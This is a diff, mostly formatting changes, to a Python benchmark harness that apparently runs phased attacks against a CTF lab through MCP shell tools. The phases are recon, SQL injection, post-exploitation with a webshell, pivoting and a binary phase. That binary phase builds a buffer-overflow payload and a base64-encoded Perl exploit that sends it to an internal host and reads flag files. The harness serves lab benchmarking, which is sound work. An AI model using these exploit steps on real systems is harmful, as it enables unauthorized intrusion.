@@ -36,7 +36,7 @@ import os
 import re
 import sys
 import time
-from datetime import datetime, timezone
+from datetime import UTC, datetime
 from pathlib import Path
 from typing import Any
 
@@ -51,6 +51,7 @@ RESULTS_DIR = Path(__file__).parent / "results"
 
 # ── Env ───────────────────────────────────────────────────────────────────────
 
+
 def _load_env() -> None:
     env_file = _ROOT / ".env"
     if env_file.exists():
@@ -63,10 +64,10 @@ def _load_env() -> None:
 
 _load_env()
 
-SANDBOX_PORT    = int(os.environ.get("SANDBOX_HOST_PORT", "8914"))
-HOST            = os.environ.get("LAB_MBPTL_HOST", "")
-WEB_PORT        = int(os.environ.get("LAB_MBPTL_PORT_WEB", "80"))
-ADMIN_PORT      = int(os.environ.get("LAB_MBPTL_PORT_ADMIN", "8080"))
+SANDBOX_PORT = int(os.environ.get("SANDBOX_HOST_PORT", "8914"))
+HOST = os.environ.get("LAB_MBPTL_HOST", "")
+WEB_PORT = int(os.environ.get("LAB_MBPTL_PORT_WEB", "80"))
+ADMIN_PORT = int(os.environ.get("LAB_MBPTL_PORT_ADMIN", "8080"))
 MBPTL_LXC_VMID = os.environ.get("LAB_MBPTL_LXC_VMID", "")
 
 PROXMOX_MCP_PORT = int(os.environ.get("PROXMOX_MCP_HOST_PORT", "8927"))
@@ -79,8 +80,8 @@ ALL_PHASES = ["recon", "web_enum", "sqli", "postexploit", "soc", "pivot", "binar
 _SHELL_PATH: str = ""
 
 
-
 # ── MCP calls ─────────────────────────────────────────────────────────────────
+
 
 def _mcp_call(code: str, timeout: int = 120, dry_run: bool = False) -> dict[str, Any]:
     if dry_run:
@@ -92,11 +93,21 @@ def _mcp_call(code: str, timeout: int = 120, dry_run: bool = False) -> dict[str,
 
     with httpx.Client(timeout=timeout + 30) as c:
         sid = ""
-        with c.stream("POST", base, headers=hdrs, json={
-            "jsonrpc": "2.0", "id": 1, "method": "initialize",
-            "params": {"protocolVersion": "2024-11-05", "capabilities": {},
-                       "clientInfo": {"name": "bench_mbptl", "version": "1"}},
-        }) as r:
+        with c.stream(
+            "POST",
+            base,
+            headers=hdrs,
+            json={
+                "jsonrpc": "2.0",
+                "id": 1,
+                "method": "initialize",
+                "params": {
+                    "protocolVersion": "2024-11-05",
+                    "capabilities": {},
+                    "clientInfo": {"name": "bench_mbptl", "version": "1"},
+                },
+            },
+        ) as r:
             r.raise_for_status()
             sid = r.headers.get("mcp-session-id", "")
             for _ in r.iter_lines():
@@ -105,11 +116,17 @@ def _mcp_call(code: str, timeout: int = 120, dry_run: bool = False) -> dict[str,
         call_hdrs = {**hdrs, "mcp-session-id": sid} if sid else hdrs
 
         last_result: dict = {}
-        with c.stream("POST", base, headers=call_hdrs, json={
-            "jsonrpc": "2.0", "id": 2, "method": "tools/call",
-            "params": {"name": "execute_bash",
-                       "arguments": {"code": code, "timeout": timeout}},
-        }) as r:
+        with c.stream(
+            "POST",
+            base,
+            headers=call_hdrs,
+            json={
+                "jsonrpc": "2.0",
+                "id": 2,
+                "method": "tools/call",
+                "params": {"name": "execute_bash", "arguments": {"code": code, "timeout": timeout}},
+            },
+        ) as r:
             r.raise_for_status()
             for line in r.iter_lines():
                 line = line.strip()
@@ -133,18 +150,30 @@ def _mcp_call(code: str, timeout: int = 120, dry_run: bool = False) -> dict[str,
     return {"ok": ok, "output": text, "elapsed_s": round(elapsed, 2), "error": error}
 
 
-def _proxmox_mcp_call(tool_name: str, arguments: dict[str, Any], timeout: int = 180) -> dict[str, Any]:
+def _proxmox_mcp_call(
+    tool_name: str, arguments: dict[str, Any], timeout: int = 180
+) -> dict[str, Any]:
     base = f"http://localhost:{PROXMOX_MCP_PORT}/mcp"
     hdrs = {"Content-Type": "application/json", "Accept": "application/json, text/event-stream"}
     t0 = time.monotonic()
 
     with httpx.Client(timeout=timeout + 30) as c:
         sid = ""
-        with c.stream("POST", base, headers=hdrs, json={
-            "jsonrpc": "2.0", "id": 1, "method": "initialize",
-            "params": {"protocolVersion": "2024-11-05", "capabilities": {},
-                       "clientInfo": {"name": "bench_mbptl", "version": "1"}},
-        }) as r:
+        with c.stream(
+            "POST",
+            base,
+            headers=hdrs,
+            json={
+                "jsonrpc": "2.0",
+                "id": 1,
+                "method": "initialize",
+                "params": {
+                    "protocolVersion": "2024-11-05",
+                    "capabilities": {},
+                    "clientInfo": {"name": "bench_mbptl", "version": "1"},
+                },
+            },
+        ) as r:
             r.raise_for_status()
             sid = r.headers.get("mcp-session-id", "")
             for _ in r.iter_lines():
@@ -152,10 +181,17 @@ def _proxmox_mcp_call(tool_name: str, arguments: dict[str, Any], timeout: int = 
 
         call_hdrs = {**hdrs, "mcp-session-id": sid} if sid else hdrs
         last_result: dict = {}
-        with c.stream("POST", base, headers=call_hdrs, json={
-            "jsonrpc": "2.0", "id": 2, "method": "tools/call",
-            "params": {"name": tool_name, "arguments": arguments},
-        }) as r:
+        with c.stream(
+            "POST",
+            base,
+            headers=call_hdrs,
+            json={
+                "jsonrpc": "2.0",
+                "id": 2,
+                "method": "tools/call",
+                "params": {"name": tool_name, "arguments": arguments},
+            },
+        ) as r:
             r.raise_for_status()
             for line in r.iter_lines():
                 line = line.strip()
@@ -181,6 +217,7 @@ def _proxmox_mcp_call(tool_name: str, arguments: dict[str, Any], timeout: int = 
 
 # ── Flag extraction ───────────────────────────────────────────────────────────
 
+
 def _extract_flags(text: str, numbers: list[int]) -> list[str]:
     found = []
     for n in numbers:
@@ -191,6 +228,7 @@ def _extract_flags(text: str, numbers: list[int]) -> list[str]:
 
 
 # ── Phase definitions ─────────────────────────────────────────────────────────
+
 
 def _phase_recon(dry_run: bool) -> dict:
     code = f"""
@@ -320,8 +358,13 @@ PYEOF
     flags = _extract_flags(out, [8, 9])
     ok = len(flags) == 2
     shell_note = f" shell={_SHELL_PATH}" if _SHELL_PATH else " shell=MISSING"
-    return {**r, "ok": ok, "flags_found": flags, "shell_path": _SHELL_PATH,
-            "detail": f"{len(flags)}/2 flags found{shell_note}"}
+    return {
+        **r,
+        "ok": ok,
+        "flags_found": flags,
+        "shell_path": _SHELL_PATH,
+        "detail": f"{len(flags)}/2 flags found{shell_note}",
+    }
 
 
 def _phase_soc(dry_run: bool) -> dict:
@@ -423,19 +466,20 @@ PYEOF
 def _phase_binary(dry_run: bool) -> dict:
     import base64 as _b64
     import struct as _struct
-    _bof = b'A' * 136 + _struct.pack('<Q', 0x4006c6)
+
+    _bof = b"A" * 136 + _struct.pack("<Q", 0x4006C6)
     _bof_hex = _bof.hex()
     # Perl exploit script (base64-encoded to avoid quoting issues in webshell)
     _perl = (
-        'use IO::Socket::INET;\n'
+        "use IO::Socket::INET;\n"
         'my $s=IO::Socket::INET->new(PeerAddr=>"172.18.0.3",PeerPort=>31337,Proto=>"tcp") or die $!;\n'
-        '$s->autoflush(1);\n'
-        'my $r; $s->recv($r,512);\n'
+        "$s->autoflush(1);\n"
+        "my $r; $s->recv($r,512);\n"
         f'my $p=pack("H*","{_bof_hex}");\n'
         'print $s $p."\\ncat /flag.txt\\ncat /flag16.txt\\n";\n'
-        'sleep(2);\n'
-        '$s->recv($r,4096);\n'
-        'print $r;\n'
+        "sleep(2);\n"
+        "$s->recv($r,4096);\n"
+        "print $r;\n"
     )
     _perl_b64 = _b64.b64encode(_perl.encode()).decode()
 
@@ -512,23 +556,23 @@ PYEOF
 
 
 PHASE_FNS = {
-    "recon":       _phase_recon,
-    "web_enum":    _phase_web_enum,
-    "sqli":        _phase_sqli,
+    "recon": _phase_recon,
+    "web_enum": _phase_web_enum,
+    "sqli": _phase_sqli,
     "postexploit": _phase_postexploit,
-    "soc":         _phase_soc,
-    "pivot":       _phase_pivot,
-    "binary":      _phase_binary,
+    "soc": _phase_soc,
+    "pivot": _phase_pivot,
+    "binary": _phase_binary,
 }
 
 PHASE_FLAGS = {
-    "recon":       [1, 2, 3],
-    "web_enum":    [4],
-    "sqli":        [5, 6, 7],
+    "recon": [1, 2, 3],
+    "web_enum": [4],
+    "sqli": [5, 6, 7],
     "postexploit": [8, 9],
-    "soc":         [10, 11, 12],
-    "pivot":       [13, 14],
-    "binary":      [15, 16, 17],
+    "soc": [10, 11, 12],
+    "pivot": [13, 14],
+    "binary": [15, 16, 17],
 }
 
 
@@ -584,7 +628,9 @@ def lab_revert(dry_run: bool = False, snapshot: str = "") -> None:
     if not MBPTL_LXC_VMID:
         return
     snap = snapshot or MBPTL_SNAPSHOT
-    print(f"\n── Lab Teardown — reverting vmid={MBPTL_LXC_VMID} → {snap!r} ...", end=" ", flush=True)
+    print(
+        f"\n── Lab Teardown — reverting vmid={MBPTL_LXC_VMID} → {snap!r} ...", end=" ", flush=True
+    )
     if dry_run:
         print("DRY-RUN")
         return
@@ -592,7 +638,10 @@ def lab_revert(dry_run: bool = False, snapshot: str = "") -> None:
         # Stop containers first so Docker state is clean on next start
         _proxmox_mcp_call(
             "proxmox_container_exec",
-            {"vmid": int(MBPTL_LXC_VMID), "command": "docker compose -f /opt/ctf-labs/mbptl/mbptl/docker-compose.yml down 2>/dev/null; true"},
+            {
+                "vmid": int(MBPTL_LXC_VMID),
+                "command": "docker compose -f /opt/ctf-labs/mbptl/mbptl/docker-compose.yml down 2>/dev/null; true",
+            },
             timeout=30,
         )
         _proxmox_mcp_call("proxmox_container_stop", {"vmid": int(MBPTL_LXC_VMID)}, timeout=30)
@@ -608,6 +657,7 @@ def lab_revert(dry_run: bool = False, snapshot: str = "") -> None:
 
 # ── Runner ────────────────────────────────────────────────────────────────────
 
+
 def run_bench(
     phases: list[str],
     runs: int,
@@ -616,7 +666,7 @@ def run_bench(
     manage_lifecycle: bool = False,
     snapshot: str = "",
 ) -> None:
-    ts = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
+    ts = datetime.now(UTC).strftime("%Y%m%dT%H%M%SZ")
     results: dict[str, Any] = {
         "bench": "mbptl",
         "started_at": ts,
@@ -678,7 +728,7 @@ def run_bench(
 
     total_elapsed = time.monotonic() - total_t0
     results["total_elapsed_s"] = round(total_elapsed, 1)
-    results["finished_at"] = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
+    results["finished_at"] = datetime.now(UTC).strftime("%Y%m%dT%H%M%SZ")
 
     all_found: list[str] = []
     for pr in results["phases"].values():
@@ -686,7 +736,9 @@ def run_bench(
     results["flags_found_total"] = len(set(all_found))
     results["flags_found"] = sorted(set(all_found))
 
-    print(f"\n{'Phase':<14} {'OK':>4} {'Fail':>4} {'Avg(s)':>8} {'Min':>6} {'Max':>6}  {'Flags':>6}  Detail")
+    print(
+        f"\n{'Phase':<14} {'OK':>4} {'Fail':>4} {'Avg(s)':>8} {'Min':>6} {'Max':>6}  {'Flags':>6}  Detail"
+    )
     print("─" * 80)
     for phase, pr in results["phases"].items():
         e = pr["elapsed_s"]
@@ -713,20 +765,37 @@ def run_bench(
 
 # ── CLI ───────────────────────────────────────────────────────────────────────
 
+
 def _parse() -> argparse.Namespace:
-    p = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
-    p.add_argument("--phases", nargs="+", choices=ALL_PHASES, default=ALL_PHASES,
-                   help="phases to run (default: all)")
+    p = argparse.ArgumentParser(
+        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter
+    )
+    p.add_argument(
+        "--phases",
+        nargs="+",
+        choices=ALL_PHASES,
+        default=ALL_PHASES,
+        help="phases to run (default: all)",
+    )
     p.add_argument("--runs", type=int, default=1, help="repetitions per phase")
     p.add_argument("--output", type=Path, help="JSON results file path")
     p.add_argument("--dry-run", action="store_true", help="skip MCP calls, measure overhead only")
-    p.add_argument("--lifecycle", action="store_true",
-                   help="Start MBPTL LXC via Proxmox MCP before bench, revert after (requires LAB_MBPTL_LXC_VMID)")
-    p.add_argument("--snapshot", default="",
-                   metavar="NAME",
-                   help="Proxmox snapshot to revert to before each run (default: LAB_MBPTL_SNAPSHOT env or 'clean')")
-    p.add_argument("--revert-only", action="store_true",
-                   help="Just revert the LXC to the clean snapshot and exit — useful for manual reset")
+    p.add_argument(
+        "--lifecycle",
+        action="store_true",
+        help="Start MBPTL LXC via Proxmox MCP before bench, revert after (requires LAB_MBPTL_LXC_VMID)",
+    )
+    p.add_argument(
+        "--snapshot",
+        default="",
+        metavar="NAME",
+        help="Proxmox snapshot to revert to before each run (default: LAB_MBPTL_SNAPSHOT env or 'clean')",
+    )
+    p.add_argument(
+        "--revert-only",
+        action="store_true",
+        help="Just revert the LXC to the clean snapshot and exit — useful for manual reset",
+    )
     return p.parse_args()
 
 
@@ -741,7 +810,10 @@ if __name__ == "__main__":
         print("ERROR: LAB_MBPTL_HOST not set. Set it in .env or environment.")
         sys.exit(1)
     run_bench(
-        args.phases, args.runs, args.dry_run, args.output,
+        args.phases,
+        args.runs,
+        args.dry_run,
+        args.output,
         manage_lifecycle=args.lifecycle,
         snapshot=args.snapshot,
     )
